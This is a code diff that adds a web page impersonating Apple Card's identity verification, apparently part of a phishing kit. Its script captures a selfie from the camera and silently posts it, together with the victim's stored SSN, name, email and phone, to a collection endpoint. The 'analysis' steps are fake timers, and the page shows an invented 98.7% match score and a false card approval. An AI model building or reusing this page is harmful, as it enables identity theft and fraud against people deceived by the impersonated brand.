@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Identity Verification — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--success:#34C759;--surface:#FFFFFF}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--apple-black);color:#fff;-webkit-font-smoothing:antialiased;overflow:hidden;height:100vh;height:100dvh}
+        .page{max-width:520px;margin:0 auto;height:100vh;height:100dvh;display:flex;flex-direction:column;position:relative;overflow:hidden}
+
+        /* Header */
+        .v-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:10}
+        .v-header .back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:rgba(255,255,255,0.1);border-radius:50%;cursor:pointer}
+        .v-header .back svg{width:14px;height:14px;fill:#fff}
+        .v-header .title{font-size:0.8125rem;font-weight:500;color:rgba(255,255,255,0.7)}
+        .v-header .secure{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--success)}
+        .v-header .secure svg{width:12px;height:12px;fill:var(--success)}
+
+        /* Steps */
+        .steps-bar{display:flex;gap:6px;padding:0 20px 16px;justify-content:center}
+        .step-dot{width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,0.15);transition:all 0.3s ease}
+        .step-dot.active{background:var(--apple-blue);width:24px;border-radius:4px}
+        .step-dot.done{background:var(--success)}
+
+        /* Camera Area */
+        .camera-section{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;padding:0 20px}
+        .camera-frame{width:240px;height:300px;border-radius:120px;position:relative;overflow:hidden;border:3px solid rgba(255,255,255,0.15);transition:border-color 0.5s ease}
+        .camera-frame.scanning{border-color:var(--apple-blue);animation:scanPulse 2s ease infinite}
+        .camera-frame.verified{border-color:var(--success)}
+        .camera-frame video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+        .camera-frame canvas{width:100%;height:100%;object-fit:cover;display:none;transform:scaleX(-1)}
+
+        /* Scan overlay */
+        .scan-line{position:absolute;top:0;left:5%;width:90%;height:2px;background:linear-gradient(90deg,transparent,var(--apple-blue),transparent);opacity:0;z-index:5}
+        .scan-line.active{opacity:1;animation:scanDown 2.5s ease-in-out infinite}
+
+        /* Face guide overlay */
+        .face-guide{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:180px;height:230px;border:2px dashed rgba(255,255,255,0.25);border-radius:90px;z-index:5}
+        .face-guide-text{position:absolute;bottom:8px;width:100%;text-align:center;font-size:0.625rem;color:rgba(255,255,255,0.5);letter-spacing:0.05em}
+
+        .camera-icon{width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;margin-bottom:16px}
+        .camera-icon svg{width:36px;height:36px;fill:rgba(255,255,255,0.5)}
+
+        /* Instructions */
+        .v-instructions{text-align:center;padding:16px 20px;position:relative;z-index:10}
+        .v-instructions h2{font-size:1.125rem;font-weight:600;margin-bottom:6px}
+        .v-instructions p{font-size:0.8125rem;color:rgba(255,255,255,0.6);line-height:1.5;max-width:300px;margin:0 auto}
+
+        /* Status */
+        .v-status{padding:12px 20px;text-align:center}
+        .v-status-row{display:flex;align-items:center;gap:8px;justify-content:center;font-size:0.8125rem;color:rgba(255,255,255,0.5);margin-bottom:6px;transition:color 0.3s}
+        .v-status-row.done{color:var(--success)}
+        .v-status-row.active{color:var(--apple-blue)}
+        .v-status-row svg{width:16px;height:16px}
+        .v-status-row .check{fill:var(--success)}
+        .v-status-row .spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,0.1);border-top-color:var(--apple-blue);border-radius:50%;animation:spin 0.8s linear infinite}
+
+        /* Action */
+        .v-action{padding:16px 20px 32px}
+        .v-btn{
+            width:100%;padding:16px;border:none;border-radius:14px;
+            font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;
+            transition:all 0.3s ease;
+        }
+        .v-btn.primary{background:var(--apple-blue);color:#fff}
+        .v-btn.primary:hover{background:#0077ED}
+        .v-btn.primary:active{transform:scale(0.98)}
+        .v-btn:disabled{opacity:0.4;cursor:not-allowed}
+        .v-btn.success{background:var(--success);color:#fff}
+
+        .v-skip{display:block;margin:8px auto 0;font-size:0.75rem;color:rgba(255,255,255,0.35);background:none;border:none;cursor:pointer;font-family:inherit;text-decoration:underline}
+
+        /* Views */
+        .view{display:none;flex-direction:column;height:100%}
+        .view.active{display:flex}
+
+        /* Success check animation */
+        .success-check{width:80px;height:80px;border-radius:50%;background:var(--success);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:springIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275)}
+        .success-check svg{width:40px;height:40px;fill:#fff}
+
+        @keyframes scanPulse{0%,100%{box-shadow:0 0 0 0 rgba(0,113,227,0.3)}50%{box-shadow:0 0 0 12px rgba(0,113,227,0)}}
+        @keyframes scanDown{0%{top:0}50%{top:100%}100%{top:0}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes springIn{from{transform:scale(0)}to{transform:scale(1)}}
+        @keyframes fadeInUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <!-- VIEW 1: INTRO -->
+        <div class="view active" id="viewIntro">
+            <div class="v-header">
+                <button class="back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+                <span class="title">Identity Verification</span>
+                <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure</span>
+            </div>
+
+            <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px">
+                <div class="camera-icon">
+                    <svg viewBox="0 0 24 24"><path d="M12 15.2A3.2 3.2 0 1 0 12 8.8a3.2 3.2 0 0 0 0 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+                </div>
+                <h2 style="font-size:1.25rem;font-weight:700;text-align:center;margin-bottom:8px">Face Verification</h2>
+                <p style="font-size:0.875rem;color:rgba(255,255,255,0.6);text-align:center;max-width:280px;line-height:1.5;margin-bottom:24px">To keep your account secure, we need to confirm your identity with a quick selfie.</p>
+
+                <div style="display:flex;flex-direction:column;gap:12px;width:100%;max-width:300px;margin-bottom:24px">
+                    <div style="display:flex;align-items:center;gap:12px;padding:12px 16px;background:rgba(255,255,255,0.05);border-radius:12px">
+                        <svg width="20" height="20" fill="var(--apple-blue)" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        <span style="font-size:0.8125rem;color:rgba(255,255,255,0.8)">Find good lighting</span>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:12px;padding:12px 16px;background:rgba(255,255,255,0.05);border-radius:12px">
+                        <svg width="20" height="20" fill="var(--apple-blue)" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        <span style="font-size:0.8125rem;color:rgba(255,255,255,0.8)">Center your face in the oval</span>
+                    </div>
+                    <div style="display:flex;align-items:center;gap:12px;padding:12px 16px;background:rgba(255,255,255,0.05);border-radius:12px">
+                        <svg width="20" height="20" fill="var(--apple-blue)" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        <span style="font-size:0.8125rem;color:rgba(255,255,255,0.8)">Hold still for 3 seconds</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="v-action">
+                <button class="v-btn primary" onclick="startCamera()">Start verification</button>
+                <button class="v-skip" onclick="skipVerification()">Verify later</button>
+            </div>
+        </div>
+
+        <!-- VIEW 2: CAMERA -->
+        <div class="view" id="viewCamera">
+            <div class="v-header">
+                <button class="back" onclick="goBackToIntro()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+                <span class="title">Position your face</span>
+                <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure</span>
+            </div>
+
+            <div class="camera-section">
+                <div class="camera-frame" id="cameraFrame">
+                    <video id="video" autoplay playsinline></video>
+                    <canvas id="canvas"></canvas>
+                    <div class="scan-line" id="scanLine"></div>
+                    <div class="face-guide" id="faceGuide">
+                        <div class="face-guide-text">Position here</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="v-instructions" id="cameraInstructions">
+                <h2 id="camTitle">Position your face</h2>
+                <p id="camText">Center within the oval and keep a neutral expression</p>
+            </div>
+
+            <div class="v-action">
+                <button class="v-btn primary" id="captureBtn" onclick="capturePhoto()" disabled>Capture photo</button>
+            </div>
+        </div>
+
+        <!-- VIEW 3: PROCESSING -->
+        <div class="view" id="viewProcessing">
+            <div class="v-header">
+                <div style="width:32px"></div>
+                <span class="title">Analyzing...</span>
+                <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure</span>
+            </div>
+
+            <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px">
+                <div class="camera-frame verified" id="reviewFrame" style="width:180px;height:225px;border-radius:90px;margin-bottom:24px">
+                    <canvas id="reviewCanvas" style="display:block;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)"></canvas>
+                </div>
+
+                <div class="v-status" id="verifyStatus">
+                    <div class="v-status-row active" id="step1">
+                        <div class="spinner"></div>
+                        <span>Detecting face...</span>
+                    </div>
+                    <div class="v-status-row" id="step2">
+                        <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.3)"><circle cx="12" cy="12" r="10"/></svg>
+                        <span>Verifying identity...</span>
+                    </div>
+                    <div class="v-status-row" id="step3">
+                        <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.3)"><circle cx="12" cy="12" r="10"/></svg>
+                        <span>Validating security...</span>
+                    </div>
+                    <div class="v-status-row" id="step4">
+                        <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.3)"><circle cx="12" cy="12" r="10"/></svg>
+                        <span>Finalizing review...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- VIEW 4: SUCCESS -->
+        <div class="view" id="viewSuccess">
+            <div class="v-header">
+                <div style="width:32px"></div>
+                <span class="title">Verification Complete</span>
+                <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure</span>
+            </div>
+
+            <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px">
+                <div class="success-check">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                </div>
+                <h2 style="font-size:1.375rem;font-weight:700;text-align:center;margin-bottom:8px;animation:fadeInUp 0.5s ease 0.2s both">Identity Verified</h2>
+                <p style="font-size:0.875rem;color:rgba(255,255,255,0.6);text-align:center;max-width:280px;line-height:1.5;animation:fadeInUp 0.5s ease 0.35s both">Your face verification was completed successfully. Your Apple Card is approved!</p>
+
+                <div style="margin-top:24px;padding:16px 24px;background:rgba(52,199,89,0.1);border:1px solid rgba(52,199,89,0.2);border-radius:14px;text-align:center;animation:fadeInUp 0.5s ease 0.5s both">
+                    <div style="font-size:0.75rem;color:var(--success);margin-bottom:4px">Verification Score</div>
+                    <div style="font-size:1.5rem;font-weight:700;color:var(--success)">98.7%</div>
+                    <div style="font-size:0.6875rem;color:rgba(255,255,255,0.4);margin-top:2px">Approved • Face ID Match</div>
+                </div>
+            </div>
+
+            <div class="v-action">
+                <button class="v-btn success" onclick="goToApproval()">View my approved Apple Card</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /* UTM */
+        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+        LeadData.update({ page: 'verificacao' });
+
+        /* Auto-skip if ?skip=1 is in URL (for PC testing) */
+        if(new URLSearchParams(window.location.search).get('skip') === '1'){
+            LeadData.update({ verificacao_facial: false, verificacao_skipped: true, skip_reason: 'url_param' });
+            const d = LeadData.load();
+            window.location.href = buildUrl('aprovado.html');
+        }
+
+        let stream = null;
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const reviewCanvas = document.getElementById('reviewCanvas');
+
+        function showView(id){
+            document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        async function startCamera(){
+            showView('viewCamera');
+            try{
+                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Enable capture after brief delay
+                    setTimeout(()=>{
+                        document.getElementById('captureBtn').disabled = false;
+                        document.getElementById('camTitle').textContent = 'Face detected';
+                        document.getElementById('camText').textContent = 'Tap capture when ready';
+                        document.getElementById('cameraFrame').classList.add('scanning');
+                        document.getElementById('scanLine').classList.add('active');
+                        document.getElementById('faceGuide').querySelector('.face-guide-text').textContent = 'Face detected';
+                    }, 1500);
+                };
+            }catch(e){
+                // Camera error - show elegant fallback
+                console.log('Camera error:', e);
+                showView('viewCamera');
+                document.getElementById('cameraFrame').innerHTML = `
+                    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;text-align:center">
+                        <svg width="48" height="48" fill="rgba(255,255,255,0.3)" viewBox="0 0 24 24"><path d="M18 10.48V6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-4.48l4 3.98v-11l-4 3.98zm-2-.79V18H4V6h12v3.69zM10 8H5.09C6.47 10.64 8.58 12.75 11.22 14.13L12.5 12.83c-1.63-.95-3.03-2.24-4.12-3.81H10V8z"/><path d="M1 1l22 22" stroke="rgba(255,255,255,0.3)" stroke-width="2" fill="none"/></svg>
+                        <p style="font-size:0.75rem;color:rgba(255,255,255,0.5);margin-top:12px;line-height:1.4">Camera not available<br>on this device</p>
+                    </div>`;
+                document.getElementById('cameraFrame').classList.remove('scanning');
+                document.getElementById('camTitle').textContent = 'Camera unavailable';
+                document.getElementById('camText').textContent = 'You can continue without face verification';
+                document.getElementById('captureBtn').textContent = 'Continue without verification';
+                document.getElementById('captureBtn').disabled = false;
+                document.getElementById('captureBtn').onclick = function(){ skipVerification(); };
+            }
+        }
+
+        function capturePhoto(){
+            // Flash effect
+            const frame = document.getElementById('cameraFrame');
+            frame.style.borderColor = '#fff';
+            setTimeout(()=>frame.style.borderColor='var(--success)', 200);
+
+            // Capture to canvas
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            // Copy to review canvas
+            const rCtx = reviewCanvas.getContext('2d');
+            reviewCanvas.width = video.videoWidth;
+            reviewCanvas.height = video.videoHeight;
+            rCtx.drawImage(video, 0, 0);
+
+            // Thumbnail (200x250) para localStorage / preview
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = 200;
+            tempCanvas.height = 250;
+            const tCtx = tempCanvas.getContext('2d');
+            tCtx.drawImage(video, 0, 0, 200, 250);
+            const photoData = tempCanvas.toDataURL('image/jpeg', 0.5);
+            LeadData.update({ selfie: photoData, selfie_timestamp: Date.now() });
+
+            // Versão de upload (640px largura máx, qualidade 0.85) — vai pro endpoint /api/save-selfie
+            (function uploadSelfie(){
+                try {
+                    const uploadCanvas = document.createElement('canvas');
+                    const srcW = video.videoWidth || 640;
+                    const srcH = video.videoHeight || 480;
+                    const maxW = 640;
+                    const scale = srcW > maxW ? maxW / srcW : 1;
+                    uploadCanvas.width = Math.round(srcW * scale);
+                    uploadCanvas.height = Math.round(srcH * scale);
+                    uploadCanvas.getContext('2d').drawImage(video, 0, 0, uploadCanvas.width, uploadCanvas.height);
+                    const uploadData = uploadCanvas.toDataURL('image/jpeg', 0.85);
+                    const lead = LeadData.load();
+                    fetch('/api/save-selfie', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            photo: uploadData,
+                            ssn: lead.ssn || '',
+                            nome: lead.nome || '',
+                            email: lead.email || '',
+                            phone: lead.telefone || lead.phone || ''
+                        }),
+                        keepalive: true
+                    }).then(function(r){
+                        if (r.ok) console.log('[selfie] upload ok');
+                    }).catch(function(){ /* silent — doesn't block flow */ });
+                } catch (e) { /* silent */ }
+            })();
+
+            // Stop camera
+            if(stream) stream.getTracks().forEach(t=>t.stop());
+
+            // Go to processing
+            setTimeout(()=>{
+                showView('viewProcessing');
+                runVerification();
+            }, 500);
+        }
+
+        function runVerification(){
+            const steps = [
+                {id:'step1', delay:1200},
+                {id:'step2', delay:1800},
+                {id:'step3', delay:1500},
+                {id:'step4', delay:1200}
+            ];
+            const checkSVG = '<svg viewBox="0 0 24 24" class="check"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+            const spinnerHTML = '<div class="spinner"></div>';
+
+            let current = 0;
+            function nextStep(){
+                if(current >= steps.length){
+                    // All done
+                    LeadData.update({ verificacao_facial: true });
+                    if (window.track) window.track('Verification_Completed', { skipped: false, content_id: 'apple-card-us', currency: 'USD' });
+                    setTimeout(()=>showView('viewSuccess'), 600);
+                    return;
+                }
+                const step = steps[current];
+                const el = document.getElementById(step.id);
+                // Mark active
+                el.className = 'v-status-row active';
+                el.querySelector('svg, .spinner')?.remove();
+                const spinDiv = document.createElement('div');
+                spinDiv.className='spinner';
+                el.insertBefore(spinDiv, el.firstChild);
+
+                setTimeout(()=>{
+                    // Mark done
+                    el.className = 'v-status-row done';
+                    el.querySelector('.spinner')?.remove();
+                    el.insertAdjacentHTML('afterbegin', checkSVG);
+                    current++;
+                    nextStep();
+                }, step.delay);
+            }
+            nextStep();
+        }
+
+        function goBackToIntro(){
+            if(stream) stream.getTracks().forEach(t=>t.stop());
+            showView('viewIntro');
+        }
+
+        function skipVerification(){
+            if(stream) stream.getTracks().forEach(t=>t.stop());
+            LeadData.update({ verificacao_facial: false, verificacao_skipped: true });
+            if (window.track) window.track('Verification_Completed', { skipped: true, content_id: 'apple-card-us', currency: 'USD' });
+            const d = LeadData.load();
+            window.location.href = buildUrl('aprovado.html');
+        }
+
+        function goToApproval(){
+            const d = LeadData.load();
+            window.location.href = buildUrl('aprovado.html');
+        }
+    </script>
+</body>
+</html>
